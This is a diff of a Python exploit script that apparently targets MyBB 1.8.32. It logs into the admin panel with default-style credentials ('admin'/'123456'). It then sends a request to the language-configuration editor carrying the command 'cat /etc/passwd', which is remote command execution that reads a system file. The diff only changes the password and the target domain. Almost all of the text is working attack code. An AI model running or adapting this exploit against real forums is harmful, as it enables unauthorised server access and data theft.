@@ -6,11 +6,11 @@ r_clients = requests.Session()
 
 data1 = {
         "username" : "admin",
-        "password" : "admin888",
+        "password" : "123456",
         "do" : "login"
     }
 
-login_txt = r_clients.post("http://www.mybb1832.cn/admin/index.php", data=data1).text
+login_txt = r_clients.post("http://www.mybb1832.com/admin/index.php", data=data1).text
 
 if "The username and password combination you entered is invalid" in login_txt:
     print("[-] Login failure. Incorrect credentials supplied")
@@ -37,7 +37,7 @@ data2 = {
 }
 
 
-exec_url = "http://www.mybb1832.cn/admin/index.php?module=config-languages&action=edit&cmd=cat+/etc/passwd"
+exec_url = "http://www.mybb1832.com/admin/index.php?module=config-languages&action=edit&cmd=cat+/etc/passwd"
 
 commands_exec = r_clients.post(exec_url, data=data2, cookies=cookies)
 
